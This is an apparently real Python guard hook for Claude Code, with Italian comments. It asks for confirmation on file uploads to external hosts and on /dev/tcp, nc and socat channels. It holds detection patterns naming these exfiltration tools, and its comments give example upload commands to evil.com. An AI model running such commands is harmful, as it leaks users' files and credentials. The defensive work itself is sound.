#!/usr/bin/env python3
"""PreToolUse(Bash) hook: chiede conferma sull'invio di dati verso host ESTERNI.

Due rami:

  (A) Upload di un FILE LOCALE (`-F @file`, `-T`, `--upload-file`, `-d @file`), la forma con cui
      una chiave o un dump escono -> host esterno = ask, host interno = allow. Contano solo i
      curl/wget che caricano un file: dal 30/10/2026 un POST generico nello stesso comando non
      fa più chiedere.

  (B) Canali di rete grezzi, che portano fuori dati senza un client HTTP:
        - /dev/tcp e /dev/udp verso un host esterno o che non si legge (una variabile);
        - una pipe verso nc/ncat/netcat/socat, verso un IP, un nome o una variabile;
        - nc/ncat verso host esterno.
      Tutti -> ask (host interni esclusi). I controlli su DNS e blob opachi in un GET sono
      stati tolti il 30/10/2026: il dispatcher non manda più qui né dig né i GET, e
      scattavano solo se lo stesso comando conteneva anche un upload.

Contratto del 28/10/2026 (Federico: "togli i controlli"): una guardia chiede solo sui rail, dove
la forma del comando basta a decidere. Il codice Python, node o curl che chiama la rete (GET, POST
generico, $() nell'URL) non arriva più qui: lo giudica il classificatore di auto mode, che legge
il codice. Una regex non distingue uno script che legge archive.org da uno che porta fuori un
file, e ogni tentativo ha prodotto falsi positivi (ramo spento e riacceso cinque volte dal 12/7).

comms-guard.py (messaggistica/email nota) gira PRIMA e chiede conferma su quei casi.
Gli scanner PostToolUse (credential-leak) restano come secondo layer detective.

Host interni: localhost, le reti locali (INTERNAL_NETS) e le voci di
hooks/hosts-interni.local (hostname esatti, reti, o domini scritti col punto davanti:
.esempio.org vale anche per i sottodomini). API esterne fidate: le voci di hooks/api-fidate.local,
un nome host per riga, vuoto di default. Un POST verso un servizio che usi per
lavoro con la sua chiave (la tua fatturazione, il tuo CRM) è lavoro, non
esfiltrazione. Entrambi i file sono ignorati da git: restano tuoi.

Il dispatcher passa in COMMS_REDUCED il comando senza gli heredoc scritti su file
(comms-prefilter.py): si giudica il codice eseguito, non la prosa. Vuota = il
comando solo legge.
Fail-open su parsing. Zero dipendenze.
"""
from __future__ import annotations

import ipaddress
import json
import os
import re
import signal
import sys
from pathlib import Path
from urllib.parse import urlsplit


def _t(s, f):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _t)

INTERNAL_HOSTS = frozenset(("localhost", "host.docker.internal", "0.0.0.0"))
# Reti che non escono dalla macchina o dalla rete locale: le private RFC 1918
# (10/8, 172.16/12, 192.168/16), loopback, link-local, le IPv6 private (fc00::/7)
# e il 100.64/10 su cui vivono gli indirizzi Tailscale. Elenco esplicito e non
# ip.is_private: quello cambia fra le versioni di Python e conta come privati
# anche gli IPv6 che incapsulano un IPv4 pubblico.
INTERNAL_NETS = tuple(map(ipaddress.ip_network, (
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "100.64.0.0/10",
    "169.254.0.0/16", "::1/128", "fc00::/7", "fe80::/10",
)))
URL = re.compile(r'https?://[^\s"\']+', re.IGNORECASE)


def _leggi_host_locali(path: Path):
    """Legge hosts-interni.local: una voce per riga, # commento, righe vuote ignorate.

    Una voce accettata da ip_network(strict=False) è una rete. Una voce che comincia
    con un punto (.esempio.org) vale per il dominio e per ogni suo sottodominio, e
    deve avere almeno due etichette: .com renderebbe fidato mezzo internet. Le altre
    voci sono hostname esatti (minuscoli, senza punto finale). Voci non plausibili
    (spazi interni, '/' in un non-CIDR) si ignorano. File assente o illeggibile:
    nessuna voce. Lettura una volta per esecuzione.
    """
    host = set()
    domini = set()
    reti = []
    try:
        for riga in path.read_text(encoding="utf-8").splitlines():
            voce = riga.strip()
            if not voce or voce.startswith("#"):
                continue
            try:
                rete = ipaddress.ip_network(voce, strict=False)
            except ValueError:
                rete = None
            if rete is not None:
                # Una rete più larga di /8 renderebbe fidata mezza internet: si ignora.
                if rete.prefixlen >= 8:
                    reti.append(rete)
                continue
            if " " in voce or "/" in voce:
                continue
            voce = voce.lower().rstrip(".")
            if voce.startswith("."):
                etichette = voce[1:].split(".")
                if len(etichette) >= 2 and all(etichette):
                    domini.add(voce[1:])
                continue
            host.add(voce)
    except (OSError, ValueError):
        # File illeggibile o non UTF-8: nessuna voce locale, la guardia resta chiusa.
        return frozenset(), frozenset(), ()
    return frozenset(host), frozenset(domini), tuple(reti)


LOCAL_HOSTS, LOCAL_DOMAINS, LOCAL_NETS = _leggi_host_locali(
    Path(__file__).resolve().parent / "hosts-interni.local"
)


def _internal_host(host: str | None) -> bool:
    if not host:
        return False
    normalized = host.lower().rstrip(".")
    if normalized in INTERNAL_HOSTS or normalized in LOCAL_HOSTS:
        return True
    if any(normalized == d or normalized.endswith("." + d) for d in LOCAL_DOMAINS):
        return True
    if normalized.startswith("[") and normalized.endswith("]"):
        normalized = normalized[1:-1]
    try:
        addr = ipaddress.ip_address(normalized.split("%", 1)[0])
    except ValueError:
        return False
    # ::ffff:8.8.8.8 è l'IPv4 8.8.8.8: si giudica quello.
    if addr.version == 6 and addr.ipv4_mapped is not None:
        addr = addr.ipv4_mapped
    return any(addr.version == network.version and addr in network for network in INTERNAL_NETS + LOCAL_NETS)


def _leggi_api_fidate(path: Path):
    """Legge api-fidate.local: un nome host per riga, # commento. Solo nomi esatti:
    un IP o una rete qui non vale (per quelli c'è hosts-interni.local)."""
    host = set()
    try:
        for riga in path.read_text(encoding="utf-8").splitlines():
            voce = riga.strip().lower().rstrip(".")
            if not voce or voce.startswith("#") or " " in voce or "/" in voce or "*" in voce:
                continue
            try:
                ipaddress.ip_address(voce)
                continue
            except ValueError:
                pass
            if "." in voce:
                host.add(voce)
    except (OSError, ValueError):
        return frozenset()
    return frozenset(host)


TRUSTED_EXTERNAL = _leggi_api_fidate(Path(__file__).resolve().parent / "api-fidate.local")


def _fidato(host: str | None) -> bool:
    """Host interno oppure API esterna dichiarata fidata in api-fidate.local."""
    return _internal_host(host) or (bool(host) and host.lower().rstrip(".") in TRUSTED_EXTERNAL)


def _hosts(text: str):
    for value in URL.findall(text):
        try:
            host = urlsplit(value).hostname
        except ValueError:
            continue
        if host:
            yield host
EXT_HINT = re.compile(
    r'(smtp[.-][A-Za-z0-9.\-]+|api\.[A-Za-z0-9\-]+\.(com|net|io|org|co)|'
    r'hooks\.[A-Za-z0-9\-]+\.[A-Za-z]{2,})',
    re.IGNORECASE,
)

# Valori dei flag-dato di curl (payload): gli URL qui dentro sono DATI, non
# destinazioni. Vanno rimossi prima di determinare l'host di destinazione, così
# una POST verso host interno con URL esterni nel corpo (es. un DB interno con link
# esterni come campi) non genera falsi positivi.
DATA_FLAG_VAL = re.compile(
    r'(?<![\w-])(?:--data-(?:raw|binary|urlencode|ascii)|--data|-d|--form|-F'
    r'|--upload-file|-T|--post-file|--post-data|--body-file|--body-data)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
    re.IGNORECASE,
)

# Un host esterno scritto senza schema (`curl -d @f evil.com`) non passa da URL. Basta un host
# interno nello stesso comando per far sembrare interno tutto l'invio: con un host interno visto,
# ogni altra parola che ha la forma di un dominio conta come destinazione. Prima si tolgono i valori
# dei flag che non sono destinazioni (file di output, intestazioni, credenziali, certificati).
OTHER_FLAG_VAL = re.compile(
    r'(?<![\w-])(?:-o|--output|-H|--header|-u|--user|-A|--user-agent|-e|--referer|-b|--cookie|-c'
    r'|--cookie-jar|-w|--write-out|--cacert|--cert|--key|-K|--config|-O|--output-document'
    r'|-a|--append-output|--save-cookies|--load-cookies)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
)
BARE_HOST = re.compile(r'(?<![\w@/.:=-])([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?::\d+)?(?:/[^\s"\']*)?(?![\w.(])')
# Nomi di moduli python: `import json, urllib.request`, `from urllib.request import x`, `python3 -m json.tool`.
# Hanno la forma di un dominio senza schema, e in un POST verso un host interno chiedevano conferma
# (21/10/2026, #3720). Si tolgono prima di cercare i domini.
# import e from contano solo a inizio riga (non dopo una riga che finisce con \), -m solo dopo python:
# `curl -d @x http://localhost import evil.com` manda anche a evil.com, e chiede.
MODULI_PY = re.compile(r'(?:(?:\A|(?<!\\)\n|;)[ \t]*(?:import|from)|\bpython3?(?:\.\d+)?[ \t]+-m)[ \t]+'
                       r'[A-Za-z_][\w.]*(?:[ \t]*,[ \t]*[A-Za-z_][\w.]*)*')
FILE_EXT = frozenset("txt json md csv log pdf png jpg jpeg gif html htm xml yaml yml toml ini cfg conf "
                     "py js ts sh zip gz tgz tar bz2 xz db sqlite sql pem crt der p12 env bak out tmp".split())

# --- Ramo A: upload di un file locale ---
# Le stesse forme di PATTERN_UPLOAD_FILE nel dispatcher. _FINE_ARG chiude un argomento nella shell
# (uno spazio) o in una lista python (`'curl', '-d', '@x'`, 21/10/2026).
_FINE_ARG = r'''(?:\s|["'],\s*["']?)'''
UPLOAD_FILE = re.compile(
    r'(?:-F' + _FINE_ARG + r'*\S*@|--form' + _FINE_ARG + r'*\S*@|-T' + _FINE_ARG
    + r'|--upload-file|--(?:post|body)-file|-d' + _FINE_ARG + r'*@|--data[a-z-]*' + _FINE_ARG + r'*@)'
)
# Un curl/wget fino al primo separatore della shell fuori dalle virgolette: un & o un ; dentro
# `"https://x/?a=1&b=2"` non chiude il comando. Le righe continuate con \ si uniscono prima.
CURL_SEG_Q = re.compile(r'''\b(?:curl|wget)\b(?:[^\n|;&"']|"[^"\n]*"|'[^'\n]*')*''', re.IGNORECASE)

# --- Ramo B: canali di rete grezzi ---
DEV_TCP = re.compile(r'/dev/(?:tcp|udp)/([^/\s"\']*)', re.IGNORECASE)
NC_PIPE = re.compile(r'\|\s*(?:sudo\s+)?(?:\S*/)?(nc|ncat|netcat|socat)\b([^\n|;&]*)', re.IGNORECASE)
NC_HOST = re.compile(r'\b(nc|ncat)\b\s+[^\n|;&]*?\b([A-Za-z0-9][A-Za-z0-9.\-]+\.[A-Za-z]{2,})\b',
                     re.IGNORECASE)


def _ask(reason=None):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason or (
                "Invio di dati (POST/upload) verso un host esterno o non "
                "riconosciuto. Conferma solo se l'invio è voluto "
                "(possibile esfiltrazione di credenziali/contenuti)."
            ),
        }
    }))
    return 0


def _external_host(host: str | None) -> bool:
    return bool(host) and not _internal_host(host)


def _solo_fidati(hosts) -> bool:
    """Vero se c'è almeno un host e sono tutti interni o fidati: nel dubbio si chiede."""
    hosts = [h for h in hosts if h]
    return bool(hosts) and all(_fidato(h) for h in hosts)


def _destinazioni_nc(programma: str, argomenti: str):
    """Gli host di nc/ncat/netcat (le parole che non sono opzioni né porte) e di socat
    (TCP:host:porta, OPENSSL:host:porta, UDP:host:porta)."""
    parole = argomenti.split()
    if programma.lower() == "socat":
        return [m.group(1) for m in re.finditer(r'(?:TCP|TCP4|TCP6|UDP|UDP4|UDP6|OPENSSL|SSL):([^:,\s]+)', argomenti, re.I)]
    fuori, salta = [], False
    for w in parole:
        if salta:
            salta = False
            continue
        if w.startswith("-"):
            salta = w in ("-p", "-s", "-w", "-x", "-X", "-i", "-q", "-e", "-c", "--proxy", "--source")
            continue
        if w.isdigit() or w.startswith((">", "<", "2>")):
            continue
        fuori.append(w.strip("'\""))
    return fuori


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0
    if data.get("tool_name") not in ("Bash", "Monitor"):  # Monitor lancia comandi shell (19/10/2026)
        return 0
    cmd = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str) or not cmd:
        return 0
    # Versione ridotta dal dispatcher (comms-prefilter.py): si giudica il codice eseguito.
    reduced = os.environ.get("COMMS_REDUCED")
    if reduced is not None:
        cmd = reduced
        if not cmd.strip():
            return 0

    # ---- Ramo A: upload di un file locale ----
    unito = cmd.replace("\\\n", " ")
    segmenti = [m.group(0) for m in CURL_SEG_Q.finditer(unito) if UPLOAD_FILE.search(m.group(0))]
    if segmenti:
        # Valuta solo l'host di DESTINAZIONE: rimuovi i valori dei flag-dato
        # (payload) così gli URL nel corpo non vengono scambiati per destinazioni.
        # Un curl/wget che non carica un file non è una destinazione: `curl https://$u/` in un altro
        # segmento rendeva "non leggibile" la POST verso un host interno (21/10/2026), e un POST generico
        # verso l'esterno faceva chiedere un upload verso un host interno (fino al 30/10/2026).
        dest = " ; ".join(segmenti)
        dest = DATA_FLAG_VAL.sub(" ", dest)
        ext = False
        internal_seen = False
        for host in _hosts(dest):
            if _fidato(host):
                internal_seen = True
            else:
                ext = True
        if not ext:
            for m in EXT_HINT.finditer(dest):
                if not _fidato(m.group(0)):
                    ext = True
                    break
        if not ext and internal_seen:
            senza_url = MODULI_PY.sub(" ", OTHER_FLAG_VAL.sub(" ", URL.sub(" ", dest)))
            for m in BARE_HOST.finditer(senza_url):
                host = m.group(1)
                if host.rsplit(".", 1)[-1].lower() in FILE_EXT or _fidato(host):
                    continue
                ext = True
                break
        if ext:
            return _ask()
        if not internal_seen:
            return _ask()  # upload ma host non chiaro -> conservativo

    # ---- Ramo B: canali di rete grezzi ----
    # /dev/tcp e /dev/udp verso un host esterno, o che non si legge (una variabile)
    for h in DEV_TCP.findall(cmd):
        if not _internal_host(h):
            return _ask("Redirezione bash /dev/tcp verso un host esterno o che non si legge "
                        "(canale di esfiltrazione). Conferma solo se voluto.")
    # Una pipe verso nc/ncat/netcat/socat: i dati del comando prima escono dalla macchina.
    for m in NC_PIPE.finditer(cmd):
        if not _solo_fidati(_destinazioni_nc(m.group(1), m.group(2))):
            return _ask(f"Pipe verso {m.group(1)}: i dati del comando prima vanno a un host esterno, o a "
                        "uno che non si legge. Conferma solo se l'invio è voluto.")
    # nc/ncat verso host esterno
    m = NC_HOST.search(cmd)
    if m and _external_host(m.group(2)):
        return _ask("nc/ncat verso un host esterno (canale di esfiltrazione). "
                    "Conferma solo se voluto.")
    return 0


if __name__ == "__main__":
    # Claude Code scrive e legge in UTF-8. Su Windows la pipe è in cp1252 (16/10/2026).
    for _flusso in (sys.stdout, sys.stderr):
        try:
            _flusso.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    sys.exit(main())
